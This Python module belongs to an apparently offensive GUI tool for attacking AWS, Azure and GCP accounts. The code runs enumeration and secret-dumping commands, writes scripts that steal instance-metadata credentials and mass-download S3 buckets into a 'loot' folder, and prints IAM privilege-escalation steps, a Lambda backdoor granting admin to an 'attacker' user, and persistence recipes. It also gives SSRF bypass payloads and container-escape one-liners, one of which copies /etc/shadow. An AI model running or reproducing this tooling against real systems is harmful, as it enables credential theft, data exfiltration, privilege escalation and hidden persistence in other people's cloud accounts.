# language: Python, file: modules/cloud.py
# cloud enumeration + lateral movement + IAM escalation + persistence
import customtkinter as ctk
import threading
import subprocess
import os
import json
import time
from utils.progress import ProgressTracker


class CloudModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "cloud"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="CLOUD OPERATIONS",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="AWS · Azure · GCP — enum, IAM privesc, persistence, exfil",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- credential source ----
        src = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        src.pack(fill="x", padx=24)
        r1 = ctk.CTkFrame(src, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)

        self.provider = ctk.CTkOptionMenu(
            r1, values=["aws", "azure", "gcp"],
            width=100, fg_color="#1a2332", button_color="#1a2332"
        )
        self.provider.pack(side="left", padx=(0, 6))

        self.access_key = ctk.CTkEntry(
            r1, placeholder_text="access key / client id",
            width=280, height=32, fg_color="#05080c", border_color="#1a2332")
        self.access_key.pack(side="left", padx=(0, 6))
        self.secret_key = ctk.CTkEntry(
            r1, placeholder_text="secret / client secret",
            width=320, height=32, show="*",
            fg_color="#05080c", border_color="#1a2332")
        self.secret_key.pack(side="left", padx=(0, 6))
        self.region_e = ctk.CTkEntry(
            r1, placeholder_text="region",
            width=120, height=32, fg_color="#05080c", border_color="#1a2332")
        self.region_e.insert(0, "us-east-1")
        self.region_e.pack(side="left")

        r2 = ctk.CTkFrame(src, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        ctk.CTkButton(r2, text="▸ SAVE CREDS", width=140, height=30,
                      fg_color="#0d2818", hover_color="#1a4a2e",
                      text_color="#00ff9c", command=self._save).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r2, text="▸ WHOAMI", width=110, height=30,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._whoami).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r2, text="▸ SCAN IMDS", width=130, height=30,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._scan_imds).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r2, text="▸ S3 BUCKET BRUTE", width=160, height=30,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._s3_brute).pack(side="left")

        # ---- attack grid ----
        ctk.CTkLabel(parent, text="Attack operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("⌖ AWS Enum", self._aws_enum),
            ("⌖ AWS IAM Privesc", self._aws_privesc),
            ("⌖ AWS S3 Exfil", self._aws_s3),
            ("⌖ AWS Secrets", self._aws_secrets),
            ("⌖ AWS Lambda Backdoor", self._aws_lambda),
            ("⌖ AWS Persist (IAM user)", self._aws_persist),
            ("⌖ Azure Enum", self._azure_enum),
            ("⌖ Azure Privesc", self._azure_privesc),
            ("⌖ Azure KeyVault", self._azure_kv),
            ("⌖ Azure Runbook", self._azure_runbook),
            ("⌖ Azure Persist (SP)", self._azure_persist),
            ("⌖ GCP Enum", self._gcp_enum),
            ("⌖ IMDSv1 SSRF", self._imds_ssrf),
            ("⌖ Container Escape", self._container_escape),
            ("⌖ K8s Token Abuse", self._k8s_token),
            ("⌖ Metadata SSH Keys", self._meta_ssh),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=210, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        # ---- output ----
        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=300
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

    def _save(self):
        os.environ["AWS_ACCESS_KEY_ID"] = self.access_key.get()
        os.environ["AWS_SECRET_ACCESS_KEY"] = self.secret_key.get()
        os.environ["AWS_DEFAULT_REGION"] = self.region_e.get()
        os.environ["AZURE_CLIENT_ID"] = self.access_key.get()
        os.environ["AZURE_CLIENT_SECRET"] = self.secret_key.get()
        self.log.put("[cloud] creds loaded to env")

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="cloud"):
        try:
            p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
            p.wait()
        except FileNotFoundError as e:
            self.log.put(f"[cloud] missing: {e.filename}")

    # ==================== AWS ====================
    def _whoami(self):
        cmd = "aws sts get-caller-identity"
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def _scan_imds(self):
        """check if running inside EC2 — try IMDS"""
        self._out("\n=== IMDS probe ===\n")
        script = """
# IMDSv1 (no token)
curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 (token first)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure IMDS
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
"""
        with open("/tmp/imds.sh", "w") as f:
            f.write(script)
        subprocess.Popen(["x-terminal-emulator", "-e", "bash /tmp/imds.sh"])

    def _aws_enum(self):
        self._save()
        cmds = [
            ("sts", "aws sts get-caller-identity"),
            ("iam-user", "aws iam get-user"),
            ("iam-attached", "aws iam list-attached-user-policies --user-name $(aws iam get-user --query User.UserName --output text)"),
            ("iam-groups", "aws iam list-groups-for-user --user-name $(aws iam get-user --query User.UserName --output text)"),
            ("ec2", "aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,Type:InstanceType,IP:PublicIpAddress,State:State.Name}'"),
            ("s3", "aws s3 ls"),
            ("secrets", "aws secretsmanager list-secrets --query 'SecretList[].Name'"),
            ("ssm", "aws ssm describe-parameters --query 'Parameters[].Name'"),
            ("lambda", "aws lambda list-functions --query 'Functions[].FunctionName'"),
            ("rds", "aws rds describe-db-instances --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine}'"),
            ("kms", "aws kms list-keys --query 'Keys[].KeyId'"),
            ("route53", "aws route53 list-hosted-zones --query 'HostedZones[].Name'"),
        ]
        for tag, cmd in cmds:
            self._out(f"\n--- {tag} ---")
            threading.Thread(target=self._run, args=(cmd, tag), daemon=True).start()

    def _aws_privesc(self):
        self._out("""
=== AWS IAM Privilege Escalation Paths ===

1. iam:CreatePolicyVersion — create v2 of attached policy with admin
   aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default

2. iam:AttachUserPolicy — attach AdministratorAccess
   aws iam attach-user-policy --user-name <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

3. iam:PassRole + ec2:RunInstances — launch EC2 with admin role
   aws ec2 run-instances --image-id ami-xxx --iam-instance-profile Name=AdminRole

4. iam:PassRole + lambda:CreateFunction + InvokeFunction
   aws lambda create-function --function-name pwn --runtime python3.9 --role <admin-role-arn> --handler index.handler --zip-file fileb://pwn.zip

5. sts:AssumeRole — assume admin role
   aws sts assume-role --role-arn <admin-role> --role-session-name pwn

6. iam:CreateAccessKey — create key for admin user
   aws iam create-access-key --user-name admin

7. ssm:SendCommand — RCE on EC2 with role attached

Tools: pacu (aws exploitation framework)
   pip install pacu && pacu
""")

    def _aws_s3(self):
        self._out("\n=== S3 exfiltration ===\n")
        script = """
# list all buckets accessible
aws s3 ls
# download everything
for b in $(aws s3 ls | awk '{print $3}'); do
    aws s3 sync s3://$b ./loot/s3/$b --quiet
done
"""
        with open("/tmp/s3_grab.sh", "w") as f:
            f.write(script)
        os.makedirs("loot/s3", exist_ok=True)
        subprocess.Popen(["x-terminal-emulator", "-e", "bash /tmp/s3_grab.sh"])

    def _aws_secrets(self):
        self._save()
        cmds = [
            "aws secretsmanager list-secrets --query 'SecretList[].Name' --output text",
            "aws ssm describe-parameters --query 'Parameters[].Name' --output text",
            "aws ssm get-parameters-by-path --path / --recursive --with-decryption",
        ]
        for c in cmds:
            threading.Thread(target=self._run, args=(c,), daemon=True).start()

    def _aws_lambda(self):
        self._out("""
=== Lambda backdoor ===
# 1. package admin backdoor
cat > backdoor.py <<'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(UserName='attacker', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return {'status': 'ok'}
EOF
zip pwn.zip backdoor.py
# 2. create with existing admin role
aws lambda create-function --function-name sys-update --runtime python3.11 \\
    --role <admin-role-arn> --handler backdoor.handler --zip-file fileb://pwn.zip
# 3. invoke
aws lambda invoke --function-name sys-update out.txt
""")

    def _aws_persist(self):
        self._out("""
=== AWS persistence ===
1. Create secondary access key:
   aws iam create-access-key --user-name <self>
2. Add to admin group:
   aws iam add-user-to-group --user-name <self> --group-name Admins
3. Create new IAM user:
   aws iam create-user --user-name svc-backup
   aws iam attach-user-policy --user-name svc-backup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
4. Backdoor trust policy of a role:
   aws iam update-assume-role-policy --role-name AdminRole --policy-document file://trust.json
5. Lambda trigger on schedule:
   aws events put-rule --schedule-expression 'rate(1 day)' --name persist
""")

    # ==================== Azure ====================
    def _azure_enum(self):
        self._save()
        cmds = [
            ("az-account", "az account show"),
            ("az-users", "az ad user list --query '[].userPrincipalName' -o tsv"),
            ("az-groups", "az ad group list --query '[].displayName' -o tsv"),
            ("az-apps", "az ad app list --query '[].{Name:displayName,Id:appId}'"),
            ("az-sp", "az ad sp list --query '[].{Name:displayName,Id:appId}'"),
            ("az-roles", "az role assignment list --all --query '[].{Principal:principalName,Role:roleDefinitionName,Scope:scope}'"),
            ("az-vms", "az vm list --query '[].{Name:name,RG:resourceGroup}'"),
            ("az-kv", "az keyvault list --query '[].{Name:name,RG:resourceGroup}'"),
            ("az-storage", "az storage account list --query '[].{Name:name,RG:resourceGroup}'"),
            ("az-rg", "az group list --query '[].name'"),
            ("az-automation", "az automation account list --query '[].name'"),
        ]
        for tag, cmd in cmds:
            self._out(f"\n--- {tag} ---")
            threading.Thread(target=self._run, args=(cmd, tag), daemon=True).start()

    def _azure_privesc(self):
        self._out("""
=== Azure privesc paths ===
1. Owner on subscription → add self as User Access Admin → grant Owner to SP
2. Application Administrator → add creds to any app → use its permissions
3. Privileged Authentication Administrator → reset any user's password
4. Privileged Role Administrator → add self to Global Admin
5. Automation Account Contributor + Run As → run as system
   az automation runbook create ...
6. Key Vault access → retrieve secrets, certs, keys
7. Managed Identity on VM → IMDS token → ARM token → subscription actions

Tools:
  roadtools (ROADrecon, roadtx)
  pip install roadtools
  ROADrecon create -u user@tenant -p pass
""")

    def _azure_kv(self):
        self._out("\n=== Azure Key Vault ===")
        cmds = [
            "az keyvault list --query '[].name' -o tsv",
        ]
        for c in cmds:
            threading.Thread(target=self._run, args=(c,), daemon=True).start()
        self._out("""
For each vault:
  az keyvault secret list --vault-name <kv>
  az keyvault secret show --vault-name <kv> --name <secret>
  az keyvault key list --vault-name <kv>
  az keyvault certificate list --vault-name <kv>
""")

    def _azure_runbook(self):
        self._out("""
=== Azure Automation Runbook → RCE as system ===
1. Find automation accounts: az automation account list
2. Create runbook with PowerShell backdoor:
   az automation runbook create --automation-account-name <aa> --resource-group <rg> --name pwn --type PowerShell
   az automation runbook replace-content --automation-account-name <aa> --resource-group <rg> --name pwn --content @pwn.ps1
3. Publish:
   az automation runbook publish --automation-account-name <aa> --resource-group <rg> --name pwn
4. Start job:
   az automation runbook start --automation-account-name <aa> --resource-group <rg> --name pwn
""")

    def _azure_persist(self):
        self._out("""
=== Azure persistence ===
1. Add credentials to app:
   az ad app credential reset --id <app-id> --append
2. Add federated identity credential (no password needed):
   az ad app federated-credential create --id <app-id> --parameters @fed.json
3. Create new service principal with Owner role
4. Modify conditional access policies
5. Create new Global Admin via Privileged Role Admin
""")

    def _gcp_enum(self):
        cmds = [
            ("gcp-auth", "gcloud auth list"),
            ("gcp-config", "gcloud config list"),
            ("gcp-iam", "gcloud projects get-iam-policy $(gcloud config get-value project)"),
            ("gcp-instances", "gcloud compute instances list"),
            ("gcp-buckets", "gsutil ls"),
            ("gcp-secrets", "gcloud secrets list"),
            ("gcp-sa", "gcloud iam service-accounts list"),
        ]
        for tag, cmd in cmds:
            self._out(f"\n--- {tag} ---")
            threading.Thread(target=self._run, args=(cmd, tag), daemon=True).start()

    # ==================== SSRF / IMDS ====================
    def _imds_ssrf(self):
        self._out("""
=== SSRF → IMDS v1 (AWS) ===
Common vulnerable endpoints: metadata proxies, url fetchers, webhooks
Payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

=== IMDS v2 bypass attempts ===
- SSRF with PUT support: add header X-aws-ec2-metadata-token-ttl-seconds
- DNS rebinding: use hostname that resolves to 169.254.169.254
- IPv6: http://[fd00:ec2::254]/
- Decimal IP: http://2852039166/
- Octal/hex: http://0251.0376.0251.0376/

=== Azure IMDS ===
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Header: Metadata: true

=== GCP ===
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google
""")

    def _container_escape(self):
        self._out("""
=== Container escape ===
1. Check privileged:
   capsh --print | grep cap_sys_admin
2. cgroup release_agent:
   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
   echo 1 > /tmp/cgrp/x/notify_on_release
   echo '/bin/sh -c "cat /etc/shadow > /tmp/out"' > /tmp/cgrp/release_agent
3. Docker socket:
   ls /var/run/docker.sock && docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host
4. hostPath mount:
   mount | grep -i host
5. /proc/sys/kernel/core_pattern:
   echo '|/bin/sh -c "id > /tmp/pwn"' > /proc/sys/kernel/core_pattern
6. CAP_SYS_ADMIN + mount:
   mkdir /tmp/host && mount /dev/sda1 /tmp/host
7. nsenter:
   nsenter -t 1 -m -u -i -n -p -- sh
""")

    def _k8s_token(self):
        self._out("""
=== K8s service account token abuse ===
Token location: /var/run/secrets/kubernetes.io/serviceaccount/token

kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \\
    --server=https://kubernetes.default.svc --insecure-skip-tls-verify \\
    auth can-i --list

Common abuse:
- create pods → mount hostPath / → escape
- create clusterrolebinding → grant self cluster-admin
- exec into existing pods with more privileges
""")

    def _meta_ssh(self):
        self._out("""
=== Metadata → SSH keys ===
AWS: not typically in IMDS
GCP: instance/attributes/ssh-keys
Azure: not exposed

For GCP:
curl -H "Metadata-Flavor: Google" \\
    http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
""")
